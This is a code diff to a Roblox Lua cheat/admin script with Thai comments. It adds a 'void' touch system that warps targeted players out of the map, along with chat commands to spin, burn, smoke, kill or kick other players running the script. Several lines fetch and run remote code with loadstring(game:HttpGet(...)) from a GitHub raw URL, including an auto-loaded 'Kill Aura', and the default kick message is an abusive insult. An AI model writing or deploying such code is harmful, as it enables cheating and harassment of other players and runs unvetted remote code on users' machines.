@@ -17,6 +17,7 @@ local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
 local GIFTED_LIST = {} 
 local HAS_COMMAND_POWER = {}
 local ACTIVE_USERS = {}
+local VOID_TARGETS = {} -- เก็บรายชื่อคนที่โดน Void
 
 -- [Start Logic] ฟังก์ชันสำหรับเล่นเสียง UI
 local function PlayUISound(id)
@@ -26,6 +27,28 @@ local function PlayUISound(id)
     s:Play()
     game:GetService("Debris"):AddItem(s, 2)
 end
+
+-- [[ VOID COLLISION SYSTEM ]] 
+-- ระบบที่ทำให้คนรันสคริปต์ทุกคน (Active Users) สามารถเดินชนเป้าหมายเพื่อส่งลง Void ได้
+local function SetupVoidTouch(char)
+    local root = char:WaitForChild("HumanoidRootPart")
+    root.Touched:Connect(function(hit)
+        if hit.Parent and hit.Parent:IsA("Model") then
+            local hPlayer = game.Players:GetPlayerFromCharacter(hit.Parent)
+            -- ตรวจสอบว่าคนที่โดนชนอยู่ในรายชื่อ VOID_TARGETS หรือไม่
+            if hPlayer and VOID_TARGETS[hPlayer.Name] then
+                local targetRoot = hit.Parent:FindFirstChild("HumanoidRootPart")
+                if targetRoot then
+                    -- พิกัดวาร์ปไปจุด Void
+                    targetRoot.CFrame = CFrame.new(102.228256, -496.832855, 407.202423)
+                end
+            end
+        end
+    end)
+end
+
+if Player.Character then SetupVoidTouch(Player.Character) end
+Player.CharacterAdded:Connect(SetupVoidTouch)
 
 -- [Effect Logic] ฟังก์ชันเพิ่มพื้นหลังเคลื่อนไหว
 local function AddBackgroundEffect(frame)
@@ -173,18 +196,18 @@ AdminTitle.TextColor3 = Color3.fromRGB(255, 50, 50); AdminTitle.BackgroundTransp
 AdminTitle.Font = Enum.Font.FredokaOne; AdminTitle.TextSize = 14
 
 local HelpList = Instance.new("TextLabel", AdminPanel)
-HelpList.Size = UDim2.new(0.9, 0, 0, 70); HelpList.Position = UDim2.new(0.05, 0, 0.12, 0)
+HelpList.Size = UDim2.new(0.9, 0, 0, 110); HelpList.Position = UDim2.new(0.05, 0, 0.12, 0)
 HelpList.BackgroundTransparency = 1; HelpList.TextColor3 = Color3.fromRGB(200, 200, 200)
-HelpList.Text = "!kill [name] | !kick [name] | !tp [name]\n!freeze [name] | !unfreeze [name]\n!givevip [name] | !killall | !kickall\n!sound [name] (Public)"
-HelpList.Font = Enum.Font.SourceSansBold; HelpList.TextSize = 12
+HelpList.Text = "!kill [n] | !kick [n] | !tp [n] | !freeze [n]\n!spin [n] [spd] | !unspin [n]\n!fire [n] | !fireRB [n] | !smoke [n]\n!void [n] | !unvoid [n]\n!givevip [n] | !killall | !kickall"
+HelpList.Font = Enum.Font.SourceSansBold; HelpList.TextSize = 11
 
 KickTextInp = Instance.new("TextBox", AdminPanel)
-KickTextInp.Size = UDim2.new(0.9, 0, 0, 32); KickTextInp.Position = UDim2.new(0.05, 0, 0.35, 0)
+KickTextInp.Size = UDim2.new(0.9, 0, 0, 32); KickTextInp.Position = UDim2.new(0.05, 0, 0.45, 0)
 KickTextInp.BackgroundColor3 = Color3.fromRGB(25, 25, 25); KickTextInp.TextColor3 = Color3.new(1,1,1)
 Instance.new("UICorner", KickTextInp); KickTextInp.Text = "โดนกูเตะไงไอ้ควาย"
 
 KickSoundInp = Instance.new("TextBox", AdminPanel)
-KickSoundInp.Size = UDim2.new(0.9, 0, 0, 32); KickSoundInp.Position = UDim2.new(0.05, 0, 0.50, 0)
+KickSoundInp.Size = UDim2.new(0.9, 0, 0, 32); KickSoundInp.Position = UDim2.new(0.05, 0, 0.58, 0)
 KickSoundInp.BackgroundColor3 = Color3.fromRGB(25, 25, 25); KickSoundInp.TextColor3 = Color3.new(1,1,1)
 Instance.new("UICorner", KickSoundInp); KickSoundInp.Text = "rbxassetid://137337370812885"
 
@@ -270,12 +293,12 @@ local function CreateBtn(txt, pos, color)
     MakeDraggable(b); return b
 end
 
--- [[ ปรับตำแหน่งการจัดเรียงปุ่ม UI ใหม่ให้เป็นระเบียบ ]]
+-- [[ UI Buttons ]]
 local MinBoardBtn = CreateBtn("📜", UDim2.new(0.95, -50, 0.3, 0), Color3.fromRGB(0, 120, 255))
 MinBoardBtn.MouseButton1Click:Connect(function() Board.Visible = not Board.Visible end)
 
 local MinAdminBtn = CreateBtn("🛡", UDim2.new(0.95, -50, 0.3, 60), Color3.fromRGB(255, 0, 0))
-MinAdminBtn.Visible = (ADMIN_COMMANDER[Player.Name] ~= nil)
+MinAdminBtn.Visible = (ADMIN_COMMANDER[Player.Name] ~= nil or HAS_COMMAND_POWER[Player.Name])
 MinAdminBtn.MouseButton1Click:Connect(function() AdminPanel.Visible = not AdminPanel.Visible end)
 
 local MinChatBtn = CreateBtn("💬", UDim2.new(0.95, -50, 0.3, 120), Color3.fromRGB(0, 200, 200))
@@ -306,20 +329,14 @@ local function ListenChat(speaker, msg)
     local cmd = args[1]:lower()
 
     local function findTarget(name)
+        if not name then return nil end
         if name == "me" or name == "all" then return name end
         for _,p in pairs(game.Players:GetPlayers()) do if p.Name:lower():sub(1,#name)==name:lower() then return p end end
         return nil
     end
     local target = args[2] and findTarget(args[2])
 
-    -- [COMMAND !sound] ทุกคนใช้ได้ และขึ้นเฉพาะคนที่ถูกระบุ
-    if cmd == "!sound" and target then
-        if (target == "me" and speaker == Player) or (typeof(target) == "Instance" and target == Player) or (target == "all") then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/%E0%B8%82%E0%B9%82%E0%B8%A1%E0%B8%A2%E0%B9%80%E0%B8%AA%E0%B8%B5%E0%B8%A2%E0%B8%87"))()
-        end
-        return
-    end
-
+    -- [SYSTEM LOGIC]
     if msg == "[ScriptWord_Ping]" then
         ACTIVE_USERS[speaker.Name] = true
         UpdateBoard()
@@ -334,52 +351,74 @@ local function ListenChat(speaker, msg)
         return
     end
 
+    -- [[ PERMISSION CHECK ]]
+    -- เฉพาะ แอดมิน, ผู้สร้าง, VIP หรือ คนที่ได้รับกิ๊ฟคำสั่งเท่านั้นที่ใช้คำสั่งได้
     local hasAnyPower = ADMIN_COMMANDER[speaker.Name] or _G.VIP_LIST[speaker.Name] or HAS_COMMAND_POWER[speaker.Name]
 
     if hasAnyPower then
         if speaker ~= Player then PlayUISound(203785501) end
         
-        if cmd == "!givevip" and target == Player then
-            GIFTED_LIST[Player.Name] = speaker.Name 
-            UpdateBoard()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
+        -- [VOID COMMANDS]
+        if cmd == "!void" and target then
+            if target == "all" then
+                for _,p in pairs(game.Players:GetPlayers()) do if p ~= speaker then VOID_TARGETS[p.Name] = true end end
+            elseif typeof(target) == "Instance" then
+                VOID_TARGETS[target.Name] = true
+            end
+        elseif cmd == "!unvoid" and target then
+            if target == "all" then
+                VOID_TARGETS = {}
+            elseif typeof(target) == "Instance" then
+                VOID_TARGETS[target.Name] = nil
+            end
         end
-        
+
+        -- [GIFT POWER COMMAND]
         if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then
             HAS_COMMAND_POWER[Player.Name] = true
             AdminPanel.Visible = true; MinAdminBtn.Visible = true
             UpdateBoard()
         end
 
-        if target == Player then
-            local isMyGiver = (GIFTED_LIST[Player.Name] == speaker.Name)
-            if ADMIN_COMMANDER[speaker.Name] or isMyGiver or HAS_COMMAND_POWER[speaker.Name] then
-                if cmd == "!kick" then CustomKick()
-                elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+        -- [TARGETING SELF OR OTHERS]
+        if target then
+            local isTargetMe = (target == "me" and speaker == Player) or (typeof(target) == "Instance" and target == Player) or (target == "all")
+            
+            if isTargetMe then
+                local char = Player.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                
+                if cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+                elseif cmd == "!kick" then CustomKick()
                 elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
                 elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
-                elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
+                elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false
+                elseif cmd == "!spin" and hrp then
+                    local speed = tonumber(args[3]) or 50
+                    local bgv = hrp:FindFirstChild("SpinVelocity") or Instance.new("BodyAngularVelocity", hrp)
+                    bgv.Name = "SpinVelocity"; bgv.MaxTorque = Vector3.new(0, math.huge, 0); bgv.AngularVelocity = Vector3.new(0, speed, 0)
+                elseif cmd == "!unspin" and hrp then
+                    if hrp:FindFirstChild("SpinVelocity") then hrp.SpinVelocity:Destroy() end
+                elseif cmd == "!fire" and hrp then Instance.new("Fire", hrp).Name = "SW_Fire"
+                elseif cmd == "!smoke" and hrp then Instance.new("Smoke", hrp).Name = "SW_Smoke"
+                end
             end
         end
 
+        -- [GLOBAL COMMANDS]
         if ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name] then
-            if cmd == "!killall" then 
-                if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
-            elseif cmd == "!kickall" then 
-                CustomKick() 
-            end
+            if cmd == "!killall" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+            elseif cmd == "!kickall" then CustomKick() end
         end
     end
 end
 
--- ทำให้คนรันสคริปต์ทุกคนขึ้นบอร์ด
+-- อัปเดตสถานะคนรันสคริปต์
 ACTIVE_USERS[MyName] = true 
 task.spawn(function()
     task.wait(2)
     local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-    if chatEvent then 
-        chatEvent.SayMessageRequest:FireServer("[ScriptWord_Ping]", "All") 
-    end
+    if chatEvent then chatEvent.SayMessageRequest:FireServer("[ScriptWord_Ping]", "All") end
 end)
 
 CmdBar.FocusLost:Connect(function(e) if e then PlayUISound(452267918); ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
@@ -387,6 +426,7 @@ game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) Liste
 for _,p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(m) ListenChat(p,m) end) end
 game.Players.PlayerRemoving:Connect(function(p) ACTIVE_USERS[p.Name] = nil; UpdateBoard() end)
 
+-- [Auto Load Kill Aura]
 if _G.VIP_LIST[MyName] or ADMIN_COMMANDER[MyName] then
     if ADMIN_COMMANDER[MyName] then AdminPanel.Visible = true end
     loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
